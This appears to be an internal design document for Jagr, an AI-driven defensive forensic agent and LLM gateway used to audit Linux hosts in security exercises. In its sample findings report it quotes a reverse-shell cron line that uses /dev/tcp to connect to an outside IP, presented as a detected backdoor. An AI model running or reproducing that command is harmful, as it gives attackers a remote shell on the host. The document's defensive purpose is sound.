# Jagr (The Hunter) — Architecture & Implementation Design Document v2.0

**Classification:** Internal / Exercise Use Only  
**Date:** March 2026

---

## 1. Executive Summary

Jagr is an autonomous, AI-driven security engineer designed for deep inspection of Linux systems within ephemeral cybersecurity exercise environments. It operates as a two-component system: a lightweight **agent** binary deployed on target hosts and a centralized **gateway server** that provides LLM intelligence, session management, and full audit logging.

The agent prioritizes **Trusted Execution** by bringing its own forensic toolset embedded within a single static Go binary, bypassing any host-level compromises. The gateway acts as the brain — managing LLM provider communication, conversation state, and exercise-wide coordination across multiple concurrent agents.

The agent communicates with the gateway using the standard **OpenAI-compatible `/v1/chat/completions` API**, meaning any OpenAI client library works out of the box. Authentication is via API key passed to the agent through environment variable or CLI flag.

---

## 2. System Architecture

### 2.1 Component Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                        GATEWAY SERVER                           │
│                                                                 │
│  ┌──────────┐  ┌──────────────┐  ┌───────────┐  ┌───────────┐  │
│  │ OpenAI   │  │   Session    │  │  Provider  │  │  Logging  │  │
│  │ Compat   │──│   Manager    │──│  Router    │──│  & Audit  │  │
│  │ API      │  │  (stateful)  │  │ (pluggable)│  │ (SQLite)  │  │
│  └──────────┘  └──────────────┘  └───────────┘  └───────────┘  │
│       ▲                                │                        │
└───────┼────────────────────────────────┼────────────────────────┘
        │ HTTPS + API Key               │ HTTPS
        │                               ▼
        │                     ┌──────────────────┐
        │                     │   LLM Provider   │
        │                     │ (OpenRouter,     │
        │                     │  Ollama, vLLM,   │
        │                     │  OpenAI, etc.)   │
        │                     └──────────────────┘
        │
   ─────┼──────────── Exercise Network ────────────────
        │
  ┌─────┴──────────────────────────┐
  │         JAGR AGENT             │
  │  (target host, runs as root)   │
  │                                │
  │  ┌───────────┐  ┌───────────┐  │
  │  │  Clean    │  │  ReAct    │  │
  │  │  Room     │  │  Loop     │  │
  │  │ (/dev/shm)│  │  Engine   │  │
  │  └───────────┘  └───────────┘  │
  │  ┌───────────┐  ┌───────────┐  │
  │  │ Embedded  │  │  OpenAI   │  │
  │  │ Tools     │  │  Client   │  │
  │  │ (busybox, │  │  (std lib)│  │
  │  │  linpeas) │  │           │  │
  │  └───────────┘  └───────────┘  │
  └────────────────────────────────┘
```

### 2.2 Communication Flow

1. Agent starts, extracts Clean Room, performs connectivity check to gateway.
2. Agent constructs an initial system prompt describing the target host context.
3. Agent sends `POST /v1/chat/completions` to the gateway with conversation history.
4. Gateway authenticates via API key, logs the request, resolves which LLM provider to use, forwards the request (translating if needed), logs the response, persists conversation to session store, and returns the completion to the agent.
5. Agent parses tool calls from the response, executes them in the Clean Room, appends results to conversation history, and loops back to step 3.
6. On completion, the agent requests a final structured report via a dedicated tool call.

---

## 3. Gateway Server Design

### 3.1 Responsibilities

The gateway is the central control plane. Its responsibilities are:

- **OpenAI-compatible API endpoint** — implements `POST /v1/chat/completions` (and optionally `GET /v1/models`) so agents can use any standard OpenAI client library with no modifications.
- **Authentication** — validates API keys on every request. Each API key maps to an agent identity within an exercise.
- **Session management** — maintains stateful conversation history per agent. The agent sends only the latest user message; the gateway reconstructs the full conversation from its session store before forwarding to the LLM.
- **Provider routing** — routes requests to the configured LLM provider (OpenRouter, Ollama, vLLM, or any OpenAI-compatible endpoint). Providers are pluggable via configuration.
- **Full audit logging** — every prompt, completion, tool call, and tool result is persisted to SQLite with timestamps and agent identity.
- **Rate limiting** — configurable per-agent rate limits to prevent runaway ReAct loops.
- **Admin API** — RESTful endpoints for exercise management, agent monitoring, and log retrieval, designed so a web UI can be added later.

### 3.2 API Surface

#### Agent-Facing API (OpenAI-compatible)

| Endpoint | Method | Description |
|---|---|---|
| `/v1/chat/completions` | POST | Standard chat completions. Accepts OpenAI request format, returns OpenAI response format. |
| `/v1/models` | GET | Lists available models (as configured in providers). |
| `/health` | GET | Gateway health check. |

The `/v1/chat/completions` endpoint must support:

- `model` field — maps to a provider + model pair via gateway config.
- `messages` array — standard role/content messages.
- `tools` / `tool_choice` — passed through to the LLM provider for function calling.
- `stream` — streaming support (boolean). The gateway should support streaming pass-through.

#### Admin API (for future UI / CLI tooling)

| Endpoint | Method | Description |
|---|---|---|
| `/admin/exercises` | GET | List active exercises. |
| `/admin/exercises/{id}/agents` | GET | List agents in an exercise. |
| `/admin/agents/{id}/sessions` | GET | List sessions for an agent. |
| `/admin/agents/{id}/sessions/{sid}/messages` | GET | Full conversation history with tool calls. |
| `/admin/agents/{id}/sessions/{sid}/events` | GET | SSE stream of live events (for future live-tail UI). |
| `/admin/agents/{id}/logs` | GET | Raw audit log entries. Supports filtering by time range and event type. |
| `/admin/api-keys` | POST/DELETE | Manage agent API keys. |

Admin API is authenticated separately (e.g., a static admin token or basic auth, configurable).

### 3.3 Provider System

Providers are configured in the gateway's config file. Each provider entry specifies:

```yaml
providers:
  - name: openrouter
    type: openai_compatible
    base_url: https://openrouter.ai/api/v1
    api_key: ${OPENROUTER_API_KEY}  # env var reference
    models:
      - alias: "default"            # model name agents request
        upstream: "anthropic/claude-sonnet-4"  # actual model ID
      - alias: "fast"
        upstream: "anthropic/claude-haiku-4"

  - name: local-ollama
    type: openai_compatible
    base_url: http://localhost:11434/v1
    api_key: ""                      # ollama doesn't need one
    models:
      - alias: "local"
        upstream: "llama3.1:70b"

  - name: vllm-cluster
    type: openai_compatible
    base_url: http://gpu-node:8000/v1
    api_key: ${VLLM_API_KEY}
    models:
      - alias: "vllm-large"
        upstream: "meta-llama/Llama-3.1-70B-Instruct"

default_provider: openrouter
default_model: default
```

Since most providers today expose an OpenAI-compatible API, the `openai_compatible` type covers OpenRouter, Ollama, vLLM, LiteLLM, and direct OpenAI. The provider interface in Go is a simple `ChatCompletion(ctx, request) (response, error)` function, so adding a non-OpenAI provider (e.g., native Anthropic API) requires only implementing that interface.

When the agent sends a request with `"model": "default"`, the gateway resolves `default` → `openrouter` provider → upstream model `anthropic/claude-sonnet-4`, rewrites the request, and forwards it.

### 3.4 Session Management

Sessions are stateful and stored in SQLite.

**Session lifecycle:**

1. First request from an agent (identified by API key) creates a new session.
2. The gateway appends the agent's message to the session history.
3. The full conversation history is sent to the LLM provider.
4. The LLM response is appended to the session history and returned to the agent.
5. Sessions can be explicitly closed via the admin API or auto-expire after a configurable timeout.

**Two operational modes for conversation management:**

- **Gateway-managed history (recommended):** The agent sends only the new message(s). The gateway prepends the full history from its session store. This reduces bandwidth and ensures the gateway has the canonical conversation state.
- **Agent-managed history (fallback):** The agent sends the full message array each time (standard OpenAI behavior). The gateway detects this mode and stores the delta. This allows compatibility with any off-the-shelf OpenAI client without modification.

The mode is configured per API key or auto-detected based on whether the agent sends a single message or full history.

**SQLite schema (core tables):**

```sql
CREATE TABLE exercises (
    id          TEXT PRIMARY KEY,
    name        TEXT NOT NULL,
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
    status      TEXT DEFAULT 'active'  -- active, completed, archived
);

CREATE TABLE agents (
    id          TEXT PRIMARY KEY,
    exercise_id TEXT NOT NULL REFERENCES exercises(id),
    api_key     TEXT UNIQUE NOT NULL,  -- hashed
    hostname    TEXT,                   -- reported by agent on first connect
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE sessions (
    id          TEXT PRIMARY KEY,
    agent_id    TEXT NOT NULL REFERENCES agents(id),
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
    status      TEXT DEFAULT 'active'
);

CREATE TABLE messages (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id  TEXT NOT NULL REFERENCES sessions(id),
    role        TEXT NOT NULL,          -- system, user, assistant, tool
    content     TEXT,
    tool_calls  TEXT,                   -- JSON array of tool calls (for assistant messages)
    tool_call_id TEXT,                  -- for tool result messages
    model       TEXT,                   -- which model generated this (for assistant messages)
    tokens_in   INTEGER,
    tokens_out  INTEGER,
    latency_ms  INTEGER,               -- LLM response time
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE audit_log (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id    TEXT NOT NULL,
    event_type  TEXT NOT NULL,          -- request, response, tool_exec, tool_result, error
    payload     TEXT NOT NULL,          -- full JSON payload
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_messages_session ON messages(session_id, created_at);
CREATE INDEX idx_audit_agent_time ON audit_log(agent_id, created_at);
```

### 3.5 Configuration

The gateway uses a single YAML config file with environment variable substitution:

```yaml
server:
  listen: ":8443"
  tls:
    cert: /etc/jagr/server.crt
    key: /etc/jagr/server.key
    # Optional: mTLS for admin API
    client_ca: /etc/jagr/ca.crt

database:
  path: /var/lib/jagr/jagr.db

rate_limit:
  requests_per_minute: 30   # per agent
  max_concurrent: 5          # per agent

session:
  timeout_minutes: 120       # auto-close inactive sessions
  history_mode: gateway      # gateway | agent

providers:
  # ... (as shown above)

default_provider: openrouter
default_model: default

logging:
  level: info
  audit: true                # enable full audit logging
```

---

## 4. Agent Design

### 4.1 The Clean Room

Upon execution, the agent creates a trusted execution environment to protect against host-level compromises (rootkits, PATH hijacking, library injection).

**Initialization sequence:**

1. **Create workspace:** Generate a randomized hidden directory in `/dev/shm` (RAM-backed tmpfs). Example: `/dev/shm/.jagr_a7f3b2`. If `/dev/shm` is mounted `noexec` or unavailable, fall back to a self-mounted tmpfs, then `/tmp` with a warning.
2. **Extract embedded tools:** Write the statically-compiled BusyBox binary and other embedded tools (linpeas.sh, pspy) from Go's `embed.FS` to the workspace.
3. **Create symlink farm:** Run `busybox --install -s <workspace>/` to create ~300 clean utility symlinks (ls, ps, grep, cat, netstat, etc.).
4. **Validate integrity:** Verify SHA-256 checksums of extracted binaries against embedded expected hashes.

**Execution sandboxing — all subprocess execution uses the Sanitized Runner, which enforces:**

- `PATH` is set exclusively to the Clean Room workspace directory.
- `HOME` is set to `/root`.
- All `LD_*` variables are stripped (whitelist approach — only `PATH`, `HOME`, `TERM` are set).
- Shell scripts are invoked explicitly via the embedded BusyBox shell: `<workspace>/sh script.sh`.
- The runner function signature: `ExecuteTrusted(ctx context.Context, command string, args []string) (stdout, stderr string, exitCode int, err error)`.

**Inspecting the host environment without contamination:** The `get_system_env` tool reads `/proc/1/environ` and `/proc/<pid>/environ` directly, parsing the null-delimited format without ever loading those variables into the agent's own process space.

### 4.2 Embedded Toolset

All tools are compiled into the agent binary via Go's `embed` directive.

| Tool | Purpose | Execution Method |
|---|---|---|
| BusyBox (static) | Clean coreutils, shell, networking utilities | Direct execution + symlink farm |
| LinPEAS | Linux privilege escalation audit | By default, staticaly built linpeas is executed, fallback to `<workspace>/sh linpeas.sh` via BusyBox shell |
| pspy | Process snooping without root (monitors /proc) | Direct execution of embedded binary |

**Build pipeline consideration:** LinPEAS and pspy should be fetched at build time (via `go generate` or Makefile) rather than committed to the repository, ensuring the agent always ships with current versions.

### 4.3 The ReAct Engine

The agent implements a Think → Act → Observe autonomous loop driven by LLM tool calling.

**Loop structure:**

1. **Think:** Send current observations and conversation history to the gateway. The LLM decides on the next action by calling one of the available tools, or concludes the investigation.
2. **Act:** Parse tool calls from the LLM response. Execute each tool via the Sanitized Runner.
3. **Observe:** Collect tool outputs. Pre-filter large outputs (see below). Append results to conversation history. Return to step 1.

**Available LLM tools:**

| Tool | Arguments | Description |
|---|---|---|
| `execute_trusted` | `command`, `args[]` | Execute an arbitrary command in the Clean Room |
| `read_file` | `path`, `max_lines` (optional) | Read a file from the host filesystem |
| `write_file` | `path`, `content` | Write content to a file (for remediation scripts) |
| `get_system_env` | `pid` (optional, default 1) | Read process environment from /proc without loading |
| `run_linpeas_sh` | `flags` (optional) | Execute LinPEAS shell script with busybox, return pre-filtered critical findings |
| `run_linpeas_static` | `flags` (optional) | Execute LinPEAS static binary, return pre-filtered critical findings |
| `run_pspy` | `duration_seconds` | Run pspy for N seconds, return observed process events |
| `list_dir` | `path`, `recursive` (optional) | List directory contents with metadata |
| `search_files` | `pattern`, `path` | Grep-like search across files |
| `get_network_info` | — | Consolidated network state (interfaces, routes, connections, listeners) |
| `submit_finding` | `finding` (JSON) | Register a confirmed finding to the report |
| `conclude` | `summary` | Signal investigation complete, trigger report generation |

**Output management for token budget:**

Large outputs (LinPEAS can produce 20,000+ lines) must be pre-filtered before being sent to the LLM. The Go-side filtering strategy:

- LinPEAS: Parse ANSI color codes to extract severity levels. Only `RED/YELLOW` (critical/high) findings are included in the initial summary. The LLM can request specific sections via `execute_trusted` with `grep` or `head/tail`.
- pspy: Deduplicate repeated process spawns. Group by binary path. Highlight unusual parents (e.g., cron spawning netcat).
- General command output: Truncate to a configurable maximum (default 500 lines), with a note indicating truncation and total line count. The LLM can request specific ranges with `head`/`tail`/`sed`.

**Loop safety guards:**

- Maximum iteration count (configurable, default 50).
- Maximum total tokens consumed (configurable, default 500k).
- Per-tool execution timeout (configurable, default 120s per command, 600s for linpeas/pspy).
- The gateway's rate limiter acts as an additional backstop.

### 4.4 Interaction Modes

- **Autonomous (batch):** The agent runs to completion without user input. The system prompt contains the objective (e.g., "Perform a full security audit of this host"). The ReAct loop runs until the LLM calls `conclude` or a safety guard triggers.
- **Interactive (human-in-the-loop):** The agent pauses after each LLM response and presents the proposed action to the operator via stdout. The operator can approve, reject, modify, or provide hints (e.g., "Look closer at /var/www/.hidden"). Hints are injected as user messages into the conversation.

The mode is selected via CLI flag: `jagr --mode batch` or `jagr --mode interactive`.

### 4.5 Agent Configuration

```
Usage: jagr [flags]

Flags:
  --gateway-url    string    Gateway server URL (required)
  --api-key        string    API key for gateway auth (or JAGR_API_KEY env)
  --mode           string    Execution mode: batch | interactive (default: interactive)
  --max-iterations int       Maximum ReAct loop iterations (default: 50)
  --model          string    Model alias to request from gateway (default: "default")
  --objective      string    Custom objective prompt (default: full security audit)
  --output-dir     string    Directory for reports (default: ./jagr-output)
  --verbose        bool      Verbose local logging (default: false)
```

---

## 5. Logging & Audit Trail

### 5.1 Logging Architecture

Logging happens at two levels:

**Gateway-side (authoritative audit log):** Every API request and response is persisted to the `audit_log` SQLite table. This is the canonical record of the exercise. It captures full prompts, full completions, tool call definitions, model used, token counts, and latency.

**Agent-side (local operational log):** The agent writes a local JSONL file (`jagr-output/jagr-events.jsonl`) as a buffer and for cases where network connectivity to the gateway is intermittent. Each line is a typed event.

### 5.2 Event Types

```json
{"ts":"2026-03-12T14:00:01Z","type":"init","workspace":"/dev/shm/.jagr_a7f3b2","hostname":"target-01"}
{"ts":"2026-03-12T14:00:02Z","type":"llm_request","model":"default","messages_count":3}
{"ts":"2026-03-12T14:00:04Z","type":"llm_response","model":"claude-sonnet-4","tool_calls":["run_linpeas"],"tokens_in":1200,"tokens_out":350}
{"ts":"2026-03-12T14:00:04Z","type":"tool_exec","tool":"run_linpeas","args":{"flags":"-a"}}
{"ts":"2026-03-12T14:00:45Z","type":"tool_result","tool":"run_linpeas","exit_code":0,"output_lines":18432,"filtered_lines":127}
{"ts":"2026-03-12T14:01:00Z","type":"finding","finding":{"type":"persistence","severity":"critical","observable":"/etc/cron.d/backdoor"}}
{"ts":"2026-03-12T14:05:00Z","type":"conclude","summary":"Investigation complete. 4 critical, 2 high findings."}
```

### 5.3 What Gets Logged

| Event | Gateway | Agent |
|---|---|---|
| Full LLM prompts (all messages) | Yes | Message count only (full history lives in gateway) |
| Full LLM responses | Yes | Tool calls + summary only |
| Tool execution commands | Yes (via tool_call in response) | Yes (full command + args) |
| Tool output (raw) | Yes (via next user message) | Yes (to local JSONL, with truncation note) |
| Findings submitted | Yes | Yes |
| Errors | Yes | Yes |
| Agent init/cleanup | No | Yes |

---

## 6. Reporting

### 6.1 Report Outputs

At the conclusion of an investigation, the agent produces three artifacts:

1. **findings.json** — Structured findings in OCSF-lite format (machine-readable).
2. **report.md** — Human-readable Markdown report with analysis, evidence, and remediation.
3. **jagr-events.jsonl** — Full local event log (audit trail).

### 6.2 OCSF-Lite Schema

```json
{
  "metadata": {
    "project": "jagr",
    "version": "2.0",
    "agent_id": "agent-target01-a7f3",
    "exercise_id": "exercise-2026-03",
    "hostname": "target-01",
    "kernel": "6.8.0-90-generic",
    "distro": "Ubuntu 24.04 LTS",
    "start_time": "2026-03-12T14:00:00Z",
    "end_time": "2026-03-12T14:12:34Z",
    "mode": "batch",
    "model": "claude-sonnet-4",
    "iterations": 23,
    "total_tokens": 187432
  },
  "findings": [
    {
      "id": "F001",
      "type": "persistence",
      "severity": "critical",
      "confidence": "high",
      "observable": "/etc/cron.d/backdoor",
      "analysis": "Cron job executes a reverse shell to 10.0.0.99:4444 using /dev/tcp. Created timestamp indicates post-compromise persistence.",
      "evidence": [
        "crontab entry: * * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1'",
        "File created: 2026-03-12T09:15:00Z, after initial compromise window"
      ],
      "mitre_attack": "T1053.003",
      "remediation_ansible": "- name: Remove backdoor cron\n  ansible.builtin.file:\n    path: /etc/cron.d/backdoor\n    state: absent",
      "remediation_manual": "rm /etc/cron.d/backdoor && systemctl restart cron"
    }
  ],
  "summary": {
    "critical": 1,
    "high": 2,
    "medium": 3,
    "low": 1,
    "info": 5
  }
}
```

### 6.3 Markdown Report Structure

The Markdown report includes: an executive summary with finding counts by severity, a host information section (kernel, distro, network, running services), detailed findings ordered by severity (each with description, evidence snippets, MITRE ATT&CK mapping, and Ansible + manual remediation), an investigation timeline (condensed from the ReAct loop), and the LLM's reasoning log (the "thinking" trace) for auditability.

### 6.4 Remediation Quality

Ansible remediation snippets are generated by the LLM and must be treated as suggestions, not production-ready playbooks. The report marks every remediation block with a **"REVIEW REQUIRED"** label. Context-dependent fixes (e.g., kernel module removal, firewall rule changes) include a warning about potential side effects.

---

## 7. Security Considerations

### 7.1 Threat Model

Jagr operates in exercise environments where the target host is assumed compromised. The threat model is:

- **In scope:** Userspace rootkits, PATH hijacking, LD_PRELOAD injection, modified system binaries, malicious cron jobs, backdoor accounts, tampered logs.
- **Out of scope:** Kernel-level rootkits that hook syscalls (e.g., execve, read). If the kernel is compromised, no userspace tool can be fully trusted. This is an explicit, documented limitation.

### 7.2 API Key Security

The agent receives its API key via environment variable (`JAGR_API_KEY`) or CLI flag. Since the agent sanitizes the environment for child processes, the API key is held only in the Go process memory and never leaked to executed tools. The gateway stores API keys hashed (Argon2id or bcrypt) and compares on each request.

### 7.3 Network Exposure

The agent communicates with the gateway directly from the target host over HTTPS. This traffic is visible on the exercise network. For exercises where OPSEC matters, consider:

- Running the gateway on the same network segment as the targets.
- Using a non-standard port.
- Adding the gateway IP to the exercise's "allowed infrastructure" list.

The gateway should bind to a specific interface and use TLS with a valid (or pinned) certificate. The agent should verify the gateway's TLS certificate. For exercise environments, a self-signed CA distributed with the agent binary (embedded) is acceptable.

### 7.4 Clean Room Limitations

The Clean Room protects against common userspace attacks but is not foolproof:

- Kernel-level syscall hooking will intercept even trusted binaries.
- `/dev/shm` with `noexec` mount flag prevents execution (mitigated by fallback logic).
- A sophisticated attacker could monitor `/dev/shm` for new files and tamper with them between extraction and execution (mitigated by checksum verification and short time window).
- BusyBox provides simplified versions of utilities — some edge cases may differ from GNU coreutils behavior.

---

## 8. Implementation Phases

### Phase 1: Foundation

**Deliverables:** Working gateway with OpenAI-compatible endpoint, SQLite persistence, single provider (OpenRouter). Agent binary with Clean Room extraction, BusyBox symlink farm, and basic `execute_trusted` tool. Agent-to-gateway communication working with `sashabaranov/go-openai` client.

**Validation:** Agent can connect to gateway, send a prompt, receive a completion, execute a command in the Clean Room, and return the result.

### Phase 2: ReAct Loop & Tooling

**Deliverables:** Full ReAct loop implementation with all tools (execute_trusted, read_file, run_linpeas, run_pspy, etc.). LinPEAS output filtering. Loop safety guards (iteration limit, token budget, timeouts). Interactive mode with human-in-the-loop approval.

**Validation:** Agent can autonomously investigate a deliberately vulnerable host (e.g., a CTF-style VM) and identify planted vulnerabilities.

### Phase 3: Multi-Agent & Provider Routing

**Deliverables:** Gateway supports multiple concurrent agents with separate sessions. Provider routing via config with model aliases. Admin API for listing agents, sessions, and logs.

**Validation:** Run 3+ agents simultaneously against different hosts in the same exercise, each maintaining independent conversation state through the gateway.

### Phase 4: Reporting & Polish

**Deliverables:** OCSF-lite JSON report generation. Markdown report with findings, evidence, MITRE mappings, and Ansible remediation. Full JSONL audit trail. Gateway rate limiting. Agent fallback logic for /dev/shm noexec.

**Validation:** Complete end-to-end exercise with multiple agents producing comprehensive, actionable reports.

---

## 9. Technology Stack

| Component | Technology |
|---|---|
| Agent language | Go (static binary, embed.FS) |
| Agent LLM client | `sashabaranov/go-openai` (or equivalent) |
| Gateway language | Go |
| Gateway HTTP | `net/http` + `gorilla/mux` or `chi` |
| Gateway TLS | `crypto/tls` (standard library) |
| Gateway storage | SQLite via `mattn/go-sqlite3` or `modernc.org/sqlite` (CGO-free) |
| Configuration | YAML (`gopkg.in/yaml.v3`) with env var substitution |
| Embedded tools | BusyBox (static ARM/x86), LinPEAS (sh), pspy (binary) |
| Reporting | Go `text/template` for Markdown, `encoding/json` for OCSF-lite |

---

## 10. Open Questions & Future Work

- **Gateway web UI:** The admin API is designed to support a real-time dashboard (SSE events endpoint included). Implementation deferred to post-MVP.
- **Multi-exercise support:** Current design scopes to a single active exercise. Extending to multiple concurrent exercises is a configuration + routing change, not architectural.
- **Agent-to-agent communication:** For exercises with multiple agents on the same network, should agents share findings? Deferred — current design has agents operating independently with the gateway as the only shared state.
- **Custom tool plugins:** Allow users to embed additional tools (custom scripts, specialized scanners) via a plugin directory at build time.
- **Offline mode:** Agent collects all data locally and replays through the gateway post-exercise for analysis. Useful for air-gapped environments.